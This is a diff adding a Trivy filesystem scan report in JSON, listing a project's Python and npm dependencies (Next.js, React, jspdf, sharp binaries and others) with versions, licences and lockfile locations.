@@ -1,0 +1,3875 @@
+{
+  "SchemaVersion": 2,
+  "Trivy": {
+    "Version": "0.76.1"
+  },
+  "ReportID": "01a1768c-1cea-7540-a9af-4b5006f4c3af",
+  "CreatedAt": "2026-10-26T11:50:56.3623443+07:00",
+  "ArtifactName": ".",
+  "ArtifactType": "filesystem",
+  "Results": [
+    {
+      "Target": "ml_model/requirements.txt",
+      "Class": "lang-pkgs",
+      "Type": "pip",
+      "Packages": [
+        {
+          "Name": "numpy",
+          "Identifier": {
+            "PURL": "pkg:pypi/numpy@2.5.4",
+            "UID": "9fb7642f21ce43c9"
+          },
+          "Version": "2.5.4",
+          "Locations": [
+            {
+              "StartLine": 3,
+              "EndLine": 3
+            }
+          ],
+          "AnalyzedBy": "pip"
+        },
+        {
+          "Name": "pandas",
+          "Identifier": {
+            "PURL": "pkg:pypi/pandas@3.0.6",
+            "UID": "f6bab0ac9e149feb"
+          },
+          "Version": "3.0.6",
+          "Locations": [
+            {
+              "StartLine": 2,
+              "EndLine": 2
+            }
+          ],
+          "AnalyzedBy": "pip"
+        },
+        {
+          "Name": "scikit-learn",
+          "Identifier": {
+            "PURL": "pkg:pypi/scikit-learn@1.9.1",
+            "UID": "ccdb32ac1fcea91c"
+          },
+          "Version": "1.9.1",
+          "Locations": [
+            {
+              "StartLine": 1,
+              "EndLine": 1
+            }
+          ],
+          "AnalyzedBy": "pip"
+        }
+      ]
+    },
+    {
+      "Target": "package-lock.json",
+      "Class": "lang-pkgs",
+      "Type": "npm",
+      "Packages": [
+        {
+          "ID": "canvas-confetti@1.9.4",
+          "Name": "canvas-confetti",
+          "Identifier": {
+            "PURL": "pkg:npm/canvas-confetti@1.9.4",
+            "UID": "7f10b9a5efcfbe8b"
+          },
+          "Version": "1.9.4",
+          "Licenses": [
+            "ISC"
+          ],
+          "Relationship": "direct",
+          "Locations": [
+            {
+              "StartLine": 2885,
+              "EndLine": 2894
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "clsx@2.1.1",
+          "Name": "clsx",
+          "Identifier": {
+            "PURL": "pkg:npm/clsx@2.1.1",
+            "UID": "181060b9a764efc0"
+          },
+          "Version": "2.1.1",
+          "Licenses": [
+            "MIT"
+          ],
+          "Relationship": "direct",
+          "Locations": [
+            {
+              "StartLine": 2938,
+              "EndLine": 2946
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "html2canvas@1.4.1",
+          "Name": "html2canvas",
+          "Identifier": {
+            "PURL": "pkg:npm/html2canvas@1.4.1",
+            "UID": "7291b64865a461e5"
+          },
+          "Version": "1.4.1",
+          "Licenses": [
+            "MIT"
+          ],
+          "Relationship": "direct",
+          "DependsOn": [
+            "css-line-break@2.1.0",
+            "text-segmentation@1.0.3"
+          ],
+          "Locations": [
+            {
+              "StartLine": 4319,
+              "EndLine": 4331
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "jspdf@4.2.1",
+          "Name": "jspdf",
+          "Identifier": {
+            "PURL": "pkg:npm/jspdf@4.2.1",
+            "UID": "cb28baac5f5c92b7"
+          },
+          "Version": "4.2.1",
+          "Licenses": [
+            "MIT"
+          ],
+          "Relationship": "direct",
+          "DependsOn": [
+            "@babel/runtime@7.29.7",
+            "canvg@3.0.11",
+            "core-js@3.50.0",
+            "dompurify@3.4.13",
+            "fast-png@6.4.0",
+            "fflate@0.8.3",
+            "html2canvas@1.4.1"
+          ],
+          "Locations": [
+            {
+              "StartLine": 4940,
+              "EndLine": 4956
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "lucide-react@1.31.0",
+          "Name": "lucide-react",
+          "Identifier": {
+            "PURL": "pkg:npm/lucide-react@1.31.0",
+            "UID": "3ad28088f8fda02b"
+          },
+          "Version": "1.31.0",
+          "Licenses": [
+            "ISC"
+          ],
+          "Relationship": "direct",
+          "DependsOn": [
+            "react@19.2.8"
+          ],
+          "Locations": [
+            {
+              "StartLine": 5336,
+              "EndLine": 5344
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "next@16.3.1",
+          "Name": "next",
+          "Identifier": {
+            "PURL": "pkg:npm/next@16.3.1",
+            "UID": "fb8518510d2300f1"
+          },
+          "Version": "16.3.1",
+          "Licenses": [
+            "MIT"
+          ],
+          "Relationship": "direct",
+          "DependsOn": [
+            "@next/env@16.3.1",
+            "@next/swc-darwin-arm64@16.3.1",
+            "@next/swc-darwin-x64@16.3.1",
+            "@next/swc-linux-arm64-gnu@16.3.1",
+            "@next/swc-linux-arm64-musl@16.3.1",
+            "@next/swc-linux-x64-gnu@16.3.1",
+            "@next/swc-linux-x64-musl@16.3.1",
+            "@next/swc-win32-arm64-msvc@16.3.1",
+            "@next/swc-win32-x64-msvc@16.3.1",
+            "@swc/helpers@0.5.23",
+            "baseline-browser-mapping@2.11.15",
+            "caniuse-lite@1.0.30001809",
+            "postcss@8.5.23",
+            "react-dom@19.2.8",
+            "react@19.2.8",
+            "sharp@0.35.3",
+            "styled-jsx@5.1.6"
+          ],
+          "Locations": [
+            {
+              "StartLine": 5460,
+              "EndLine": 5512
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "react@19.2.8",
+          "Name": "react",
+          "Identifier": {
+            "PURL": "pkg:npm/react@19.2.8",
+            "UID": "904a9ec3d420812c"
+          },
+          "Version": "19.2.8",
+          "Licenses": [
+            "MIT"
+          ],
+          "Relationship": "direct",
+          "Locations": [
+            {
+              "StartLine": 5946,
+              "EndLine": 5954
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "react-dom@19.2.8",
+          "Name": "react-dom",
+          "Identifier": {
+            "PURL": "pkg:npm/react-dom@19.2.8",
+            "UID": "d33b3fc587b5ba5a"
+          },
+          "Version": "19.2.8",
+          "Licenses": [
+            "MIT"
+          ],
+          "Relationship": "direct",
+          "DependsOn": [
+            "react@19.2.8",
+            "scheduler@0.27.0"
+          ],
+          "Locations": [
+            {
+              "StartLine": 5955,
+              "EndLine": 5966
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "tailwind-merge@3.6.0",
+          "Name": "tailwind-merge",
+          "Identifier": {
+            "PURL": "pkg:npm/tailwind-merge@3.6.0",
+            "UID": "755cccc32563e273"
+          },
+          "Version": "3.6.0",
+          "Licenses": [
+            "MIT"
+          ],
+          "Relationship": "direct",
+          "Locations": [
+            {
+              "StartLine": 6632,
+              "EndLine": 6641
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@babel/runtime@7.29.7",
+          "Name": "@babel/runtime",
+          "Identifier": {
+            "PURL": "pkg:npm/%40babel/runtime@7.29.7",
+            "UID": "f7e05e77b8e30365"
+          },
+          "Version": "7.29.7",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 238,
+              "EndLine": 246
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@emnapi/runtime@1.11.3",
+          "Name": "@emnapi/runtime",
+          "Identifier": {
+            "PURL": "pkg:npm/%40emnapi/runtime@1.11.3",
+            "UID": "ceb3248bba44b3df"
+          },
+          "Version": "1.11.3",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "tslib@2.8.1"
+          ],
+          "Locations": [
+            {
+              "StartLine": 307,
+              "EndLine": 316
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@img/colour@1.1.0",
+          "Name": "@img/colour",
+          "Identifier": {
+            "PURL": "pkg:npm/%40img/colour@1.1.0",
+            "UID": "22e2ac5d8c3f0e4c"
+          },
+          "Version": "1.1.0",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 538,
+              "EndLine": 547
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@img/sharp-darwin-arm64@0.35.3",
+          "Name": "@img/sharp-darwin-arm64",
+          "Identifier": {
+            "PURL": "pkg:npm/%40img/sharp-darwin-arm64@0.35.3",
+            "UID": "6e580dc1334cfd08"
+          },
+          "Version": "0.35.3",
+          "Licenses": [
+            "Apache-2.0"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "@img/sharp-libvips-darwin-arm64@1.3.2"
+          ],
+          "Locations": [
+            {
+              "StartLine": 548,
+              "EndLine": 569
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@img/sharp-darwin-x64@0.35.3",
+          "Name": "@img/sharp-darwin-x64",
+          "Identifier": {
+            "PURL": "pkg:npm/%40img/sharp-darwin-x64@0.35.3",
+            "UID": "cba26664e005f93a"
+          },
+          "Version": "0.35.3",
+          "Licenses": [
+            "Apache-2.0"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "@img/sharp-libvips-darwin-x64@1.3.2"
+          ],
+          "Locations": [
+            {
+              "StartLine": 570,
+              "EndLine": 591
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@img/sharp-freebsd-wasm32@0.35.3",
+          "Name": "@img/sharp-freebsd-wasm32",
+          "Identifier": {
+            "PURL": "pkg:npm/%40img/sharp-freebsd-wasm32@0.35.3",
+            "UID": "1870b57e67844404"
+          },
+          "Version": "0.35.3",
+          "Licenses": [
+            "Apache-2.0"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "@img/sharp-wasm32@0.35.3"
+          ],
+          "Locations": [
+            {
+              "StartLine": 592,
+              "EndLine": 610
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@img/sharp-libvips-darwin-arm64@1.3.2",
+          "Name": "@img/sharp-libvips-darwin-arm64",
+          "Identifier": {
+            "PURL": "pkg:npm/%40img/sharp-libvips-darwin-arm64@1.3.2",
+            "UID": "e72983435850fe51"
+          },
+          "Version": "1.3.2",
+          "Licenses": [
+            "LGPL-3.0-or-later"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 611,
+              "EndLine": 626
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@img/sharp-libvips-darwin-x64@1.3.2",
+          "Name": "@img/sharp-libvips-darwin-x64",
+          "Identifier": {
+            "PURL": "pkg:npm/%40img/sharp-libvips-darwin-x64@1.3.2",
+            "UID": "a4e93b49f64b5f9f"
+          },
+          "Version": "1.3.2",
+          "Licenses": [
+            "LGPL-3.0-or-later"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 627,
+              "EndLine": 642
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@img/sharp-libvips-linux-arm@1.3.2",
+          "Name": "@img/sharp-libvips-linux-arm",
+          "Identifier": {
+            "PURL": "pkg:npm/%40img/sharp-libvips-linux-arm@1.3.2",
+            "UID": "c0e2d1c283fc584c"
+          },
+          "Version": "1.3.2",
+          "Licenses": [
+            "LGPL-3.0-or-later"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 643,
+              "EndLine": 661
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@img/sharp-libvips-linux-arm64@1.3.2",
+          "Name": "@img/sharp-libvips-linux-arm64",
+          "Identifier": {
+            "PURL": "pkg:npm/%40img/sharp-libvips-linux-arm64@1.3.2",
+            "UID": "97f79af6d2b6373c"
+          },
+          "Version": "1.3.2",
+          "Licenses": [
+            "LGPL-3.0-or-later"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 662,
+              "EndLine": 680
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@img/sharp-libvips-linux-ppc64@1.3.2",
+          "Name": "@img/sharp-libvips-linux-ppc64",
+          "Identifier": {
+            "PURL": "pkg:npm/%40img/sharp-libvips-linux-ppc64@1.3.2",
+            "UID": "f7a68dd6ce917485"
+          },
+          "Version": "1.3.2",
+          "Licenses": [
+            "LGPL-3.0-or-later"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 681,
+              "EndLine": 699
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@img/sharp-libvips-linux-riscv64@1.3.2",
+          "Name": "@img/sharp-libvips-linux-riscv64",
+          "Identifier": {
+            "PURL": "pkg:npm/%40img/sharp-libvips-linux-riscv64@1.3.2",
+            "UID": "6d908dc814939059"
+          },
+          "Version": "1.3.2",
+          "Licenses": [
+            "LGPL-3.0-or-later"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 700,
+              "EndLine": 718
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@img/sharp-libvips-linux-s390x@1.3.2",
+          "Name": "@img/sharp-libvips-linux-s390x",
+          "Identifier": {
+            "PURL": "pkg:npm/%40img/sharp-libvips-linux-s390x@1.3.2",
+            "UID": "7a3a45d4a836657c"
+          },
+          "Version": "1.3.2",
+          "Licenses": [
+            "LGPL-3.0-or-later"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 719,
+              "EndLine": 737
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@img/sharp-libvips-linux-x64@1.3.2",
+          "Name": "@img/sharp-libvips-linux-x64",
+          "Identifier": {
+            "PURL": "pkg:npm/%40img/sharp-libvips-linux-x64@1.3.2",
+            "UID": "39ff51dc9797d0e6"
+          },
+          "Version": "1.3.2",
+          "Licenses": [
+            "LGPL-3.0-or-later"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 738,
+              "EndLine": 756
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@img/sharp-libvips-linuxmusl-arm64@1.3.2",
+          "Name": "@img/sharp-libvips-linuxmusl-arm64",
+          "Identifier": {
+            "PURL": "pkg:npm/%40img/sharp-libvips-linuxmusl-arm64@1.3.2",
+            "UID": "c5b2f501a9cb44e5"
+          },
+          "Version": "1.3.2",
+          "Licenses": [
+            "LGPL-3.0-or-later"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 757,
+              "EndLine": 775
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@img/sharp-libvips-linuxmusl-x64@1.3.2",
+          "Name": "@img/sharp-libvips-linuxmusl-x64",
+          "Identifier": {
+            "PURL": "pkg:npm/%40img/sharp-libvips-linuxmusl-x64@1.3.2",
+            "UID": "b1c9394024a12da4"
+          },
+          "Version": "1.3.2",
+          "Licenses": [
+            "LGPL-3.0-or-later"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 776,
+              "EndLine": 794
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@img/sharp-linux-arm@0.35.3",
+          "Name": "@img/sharp-linux-arm",
+          "Identifier": {
+            "PURL": "pkg:npm/%40img/sharp-linux-arm@0.35.3",
+            "UID": "afb97a0641f6f8a2"
+          },
+          "Version": "0.35.3",
+          "Licenses": [
+            "Apache-2.0"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "@img/sharp-libvips-linux-arm@1.3.2"
+          ],
+          "Locations": [
+            {
+              "StartLine": 795,
+              "EndLine": 819
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@img/sharp-linux-arm64@0.35.3",
+          "Name": "@img/sharp-linux-arm64",
+          "Identifier": {
+            "PURL": "pkg:npm/%40img/sharp-linux-arm64@0.35.3",
+            "UID": "dc1da2d91f1822d2"
+          },
+          "Version": "0.35.3",
+          "Licenses": [
+            "Apache-2.0"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "@img/sharp-libvips-linux-arm64@1.3.2"
+          ],
+          "Locations": [
+            {
+              "StartLine": 820,
+              "EndLine": 844
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@img/sharp-linux-ppc64@0.35.3",
+          "Name": "@img/sharp-linux-ppc64",
+          "Identifier": {
+            "PURL": "pkg:npm/%40img/sharp-linux-ppc64@0.35.3",
+            "UID": "9885d563b773c310"
+          },
+          "Version": "0.35.3",
+          "Licenses": [
+            "Apache-2.0"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "@img/sharp-libvips-linux-ppc64@1.3.2"
+          ],
+          "Locations": [
+            {
+              "StartLine": 845,
+              "EndLine": 869
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@img/sharp-linux-riscv64@0.35.3",
+          "Name": "@img/sharp-linux-riscv64",
+          "Identifier": {
+            "PURL": "pkg:npm/%40img/sharp-linux-riscv64@0.35.3",
+            "UID": "1c17dbf1f01adfc6"
+          },
+          "Version": "0.35.3",
+          "Licenses": [
+            "Apache-2.0"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "@img/sharp-libvips-linux-riscv64@1.3.2"
+          ],
+          "Locations": [
+            {
+              "StartLine": 870,
+              "EndLine": 894
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@img/sharp-linux-s390x@0.35.3",
+          "Name": "@img/sharp-linux-s390x",
+          "Identifier": {
+            "PURL": "pkg:npm/%40img/sharp-linux-s390x@0.35.3",
+            "UID": "8b21f947b5a90565"
+          },
+          "Version": "0.35.3",
+          "Licenses": [
+            "Apache-2.0"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "@img/sharp-libvips-linux-s390x@1.3.2"
+          ],
+          "Locations": [
+            {
+              "StartLine": 895,
+              "EndLine": 919
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@img/sharp-linux-x64@0.35.3",
+          "Name": "@img/sharp-linux-x64",
+          "Identifier": {
+            "PURL": "pkg:npm/%40img/sharp-linux-x64@0.35.3",
+            "UID": "f6455ef738fafcb0"
+          },
+          "Version": "0.35.3",
+          "Licenses": [
+            "Apache-2.0"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "@img/sharp-libvips-linux-x64@1.3.2"
+          ],
+          "Locations": [
+            {
+              "StartLine": 920,
+              "EndLine": 944
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@img/sharp-linuxmusl-arm64@0.35.3",
+          "Name": "@img/sharp-linuxmusl-arm64",
+          "Identifier": {
+            "PURL": "pkg:npm/%40img/sharp-linuxmusl-arm64@0.35.3",
+            "UID": "961a1c988206f9c0"
+          },
+          "Version": "0.35.3",
+          "Licenses": [
+            "Apache-2.0"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "@img/sharp-libvips-linuxmusl-arm64@1.3.2"
+          ],
+          "Locations": [
+            {
+              "StartLine": 945,
+              "EndLine": 969
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@img/sharp-linuxmusl-x64@0.35.3",
+          "Name": "@img/sharp-linuxmusl-x64",
+          "Identifier": {
+            "PURL": "pkg:npm/%40img/sharp-linuxmusl-x64@0.35.3",
+            "UID": "56f6c4c9b0db1b61"
+          },
+          "Version": "0.35.3",
+          "Licenses": [
+            "Apache-2.0"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "@img/sharp-libvips-linuxmusl-x64@1.3.2"
+          ],
+          "Locations": [
+            {
+              "StartLine": 970,
+              "EndLine": 994
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@img/sharp-wasm32@0.35.3",
+          "Name": "@img/sharp-wasm32",
+          "Identifier": {
+            "PURL": "pkg:npm/%40img/sharp-wasm32@0.35.3",
+            "UID": "86afd023484b0e82"
+          },
+          "Version": "0.35.3",
+          "Licenses": [
+            "Apache-2.0 AND LGPL-3.0-or-later AND MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "@emnapi/runtime@1.11.3"
+          ],
+          "Locations": [
+            {
+              "StartLine": 995,
+              "EndLine": 1010
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@img/sharp-webcontainers-wasm32@0.35.3",
+          "Name": "@img/sharp-webcontainers-wasm32",
+          "Identifier": {
+            "PURL": "pkg:npm/%40img/sharp-webcontainers-wasm32@0.35.3",
+            "UID": "ab212f240d782bc6"
+          },
+          "Version": "0.35.3",
+          "Licenses": [
+            "Apache-2.0"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "@img/sharp-wasm32@0.35.3"
+          ],
+          "Locations": [
+            {
+              "StartLine": 1011,
+              "EndLine": 1029
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@img/sharp-win32-arm64@0.35.3",
+          "Name": "@img/sharp-win32-arm64",
+          "Identifier": {
+            "PURL": "pkg:npm/%40img/sharp-win32-arm64@0.35.3",
+            "UID": "309acad32c93f773"
+          },
+          "Version": "0.35.3",
+          "Licenses": [
+            "Apache-2.0 AND LGPL-3.0-or-later"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 1030,
+              "EndLine": 1048
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@img/sharp-win32-ia32@0.35.3",
+          "Name": "@img/sharp-win32-ia32",
+          "Identifier": {
+            "PURL": "pkg:npm/%40img/sharp-win32-ia32@0.35.3",
+            "UID": "852fd559af2078c"
+          },
+          "Version": "0.35.3",
+          "Licenses": [
+            "Apache-2.0 AND LGPL-3.0-or-later"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 1049,
+              "EndLine": 1067
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@img/sharp-win32-x64@0.35.3",
+          "Name": "@img/sharp-win32-x64",
+          "Identifier": {
+            "PURL": "pkg:npm/%40img/sharp-win32-x64@0.35.3",
+            "UID": "dc9bc3b90a37180"
+          },
+          "Version": "0.35.3",
+          "Licenses": [
+            "Apache-2.0 AND LGPL-3.0-or-later"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 1068,
+              "EndLine": 1086
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@next/env@16.3.1",
+          "Name": "@next/env",
+          "Identifier": {
+            "PURL": "pkg:npm/%40next/env@16.3.1",
+            "UID": "1f0d0a5849c4ae67"
+          },
+          "Version": "16.3.1",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 1159,
+              "EndLine": 1164
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@next/swc-darwin-arm64@16.3.1",
+          "Name": "@next/swc-darwin-arm64",
+          "Identifier": {
+            "PURL": "pkg:npm/%40next/swc-darwin-arm64@16.3.1",
+            "UID": "e0b81224b45a4001"
+          },
+          "Version": "16.3.1",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 1208,
+              "EndLine": 1223
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@next/swc-darwin-x64@16.3.1",
+          "Name": "@next/swc-darwin-x64",
+          "Identifier": {
+            "PURL": "pkg:npm/%40next/swc-darwin-x64@16.3.1",
+            "UID": "bdc39ebeedac1135"
+          },
+          "Version": "16.3.1",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 1224,
+              "EndLine": 1239
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@next/swc-linux-arm64-gnu@16.3.1",
+          "Name": "@next/swc-linux-arm64-gnu",
+          "Identifier": {
+            "PURL": "pkg:npm/%40next/swc-linux-arm64-gnu@16.3.1",
+            "UID": "a3b976e1b6dea6d2"
+          },
+          "Version": "16.3.1",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 1240,
+              "EndLine": 1258
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@next/swc-linux-arm64-musl@16.3.1",
+          "Name": "@next/swc-linux-arm64-musl",
+          "Identifier": {
+            "PURL": "pkg:npm/%40next/swc-linux-arm64-musl@16.3.1",
+            "UID": "8c4f212306ebbd9f"
+          },
+          "Version": "16.3.1",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 1259,
+              "EndLine": 1277
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@next/swc-linux-x64-gnu@16.3.1",
+          "Name": "@next/swc-linux-x64-gnu",
+          "Identifier": {
+            "PURL": "pkg:npm/%40next/swc-linux-x64-gnu@16.3.1",
+            "UID": "7d8570719006228b"
+          },
+          "Version": "16.3.1",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 1278,
+              "EndLine": 1296
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@next/swc-linux-x64-musl@16.3.1",
+          "Name": "@next/swc-linux-x64-musl",
+          "Identifier": {
+            "PURL": "pkg:npm/%40next/swc-linux-x64-musl@16.3.1",
+            "UID": "ea4ffc9195b7803d"
+          },
+          "Version": "16.3.1",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 1297,
+              "EndLine": 1315
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@next/swc-win32-arm64-msvc@16.3.1",
+          "Name": "@next/swc-win32-arm64-msvc",
+          "Identifier": {
+            "PURL": "pkg:npm/%40next/swc-win32-arm64-msvc@16.3.1",
+            "UID": "be0ff40114d4c270"
+          },
+          "Version": "16.3.1",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 1316,
+              "EndLine": 1331
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@next/swc-win32-x64-msvc@16.3.1",
+          "Name": "@next/swc-win32-x64-msvc",
+          "Identifier": {
+            "PURL": "pkg:npm/%40next/swc-win32-x64-msvc@16.3.1",
+            "UID": "1b401ee7b4943f5c"
+          },
+          "Version": "16.3.1",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 1332,
+              "EndLine": 1347
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@swc/helpers@0.5.23",
+          "Name": "@swc/helpers",
+          "Identifier": {
+            "PURL": "pkg:npm/%40swc/helpers@0.5.23",
+            "UID": "ff12d5d731d0b675"
+          },
+          "Version": "0.5.23",
+          "Licenses": [
+            "Apache-2.0"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "tslib@2.8.1"
+          ],
+          "Locations": [
+            {
+              "StartLine": 1403,
+              "EndLine": 1411
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@types/pako@2.0.4",
+          "Name": "@types/pako",
+          "Identifier": {
+            "PURL": "pkg:npm/%40types/pako@2.0.4",
+            "UID": "9398a9795d066de4"
+          },
+          "Version": "2.0.4",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 1744,
+              "EndLine": 1749
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@types/raf@3.4.3",
+          "Name": "@types/raf",
+          "Identifier": {
+            "PURL": "pkg:npm/%40types/raf@3.4.3",
+            "UID": "1aa61c4fe4b76ca2"
+          },
+          "Version": "3.4.3",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 1750,
+              "EndLine": 1756
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@types/trusted-types@2.0.7",
+          "Name": "@types/trusted-types",
+          "Identifier": {
+            "PURL": "pkg:npm/%40types/trusted-types@2.0.7",
+            "UID": "65e0565a5fa06a75"
+          },
+          "Version": "2.0.7",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 1777,
+              "EndLine": 1783
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "base64-arraybuffer@1.0.2",
+          "Name": "base64-arraybuffer",
+          "Identifier": {
+            "PURL": "pkg:npm/base64-arraybuffer@1.0.2",
+            "UID": "9d5e57cbfe8dcd92"
+          },
+          "Version": "1.0.2",
